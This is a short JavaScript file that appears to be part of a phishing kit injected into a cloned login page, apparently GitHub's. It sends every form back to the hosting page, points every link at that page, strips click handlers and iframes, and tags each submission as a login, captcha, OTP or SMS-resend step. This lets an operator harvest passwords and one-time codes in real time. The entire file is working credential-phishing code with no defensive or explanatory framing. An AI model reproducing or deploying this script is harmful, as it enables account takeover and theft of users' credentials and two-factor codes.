let allForms = document.querySelectorAll("form")
for (let form of allForms) {
    form.innerHTML += `<input type="hidden" name="spike-type">`
}
// setting spike type
function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spike-type"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

document.querySelectorAll("form").forEach(f => {
    f.action = location.href
    f.method = "POST"
    f.noValidate = true
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("[onclick]").forEach(onclk => {
    onclk.onclick = function () { }
})


let allText = document.body.innerText

let login_field = document.querySelector("#login_field")
let password = document.querySelector("#password")

let otp_code = document.querySelector("#sms_totp")
let subMit = document.querySelector(`[type="submit"]`)

// set
if (login_field && password) {
    addSpikeType("login")
} else if (allText.includes("Please verify that you're a human.")) {
    addSpikeType("captcha")
    setTimeout(() => {
        let btn = document.querySelector(`[type="submit"]`)
        btn.disabled = false
    }, 16000)
} else if (otp_code) {
    addSpikeType("otp_code")
} else if (subMit.innerText.includes("Send SMS")) {
    addSpikeType("click_send_sms")
}


// functions
let allATag = document.querySelectorAll("a")
allATag.forEach(a => {
    if (a.innerText.includes("Resend SMS")) {
        a.type = "button"
        a.removeAttribute("href")
        a.addEventListener("click", () => {
            addSpikeType("resend_otp")
            document.forms[0].submit()
        })
    }
})